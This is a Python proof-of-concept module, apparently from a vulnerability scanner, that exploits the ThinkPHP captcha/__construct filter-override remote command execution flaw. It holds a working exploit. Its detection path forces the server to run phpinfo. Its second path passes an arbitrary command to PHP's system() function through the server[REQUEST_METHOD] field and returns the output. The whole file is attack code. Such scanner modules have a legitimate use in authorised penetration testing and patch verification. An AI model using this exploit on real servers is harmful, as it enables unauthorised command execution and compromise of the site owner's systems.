# -*- coding:utf-8 -*-
# Thinkphp debug命令执行
from ServiceScanModel.models import ServiceScan

from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False


    def thinphp_debug(self, url, cmd=""):
        try:
            if cmd == "":
                resp = self.requestUtil.post(url + "/index.php?s=captcha", data={
                    "_method": "__construct",
                    "filter[]": "phpinfo",
                    "method": "get",
                    "server[REQUEST_METHOD]": 1
                })
                if "http://www.php.net/" in resp.text:
                    return ["Thinkphp debug命令执行", "phpinfo() is executed"]
                else:
                    return []
            else:
                resp = self.requestUtil.post(url + "/index.php?s=captcha", data={
                    "_method": "__construct",
                    "filter[]": "system",
                    "method": "get",
                    "server[REQUEST_METHOD]": cmd
                })
                return "".join(resp.text.split("<!DOCTYPE html>")[:-1])
        except:
            return []


    def fingerprint(self):
        if self.service.url:
            return True


    def poc(self):
        return self.thinphp_debug(self.service.url)
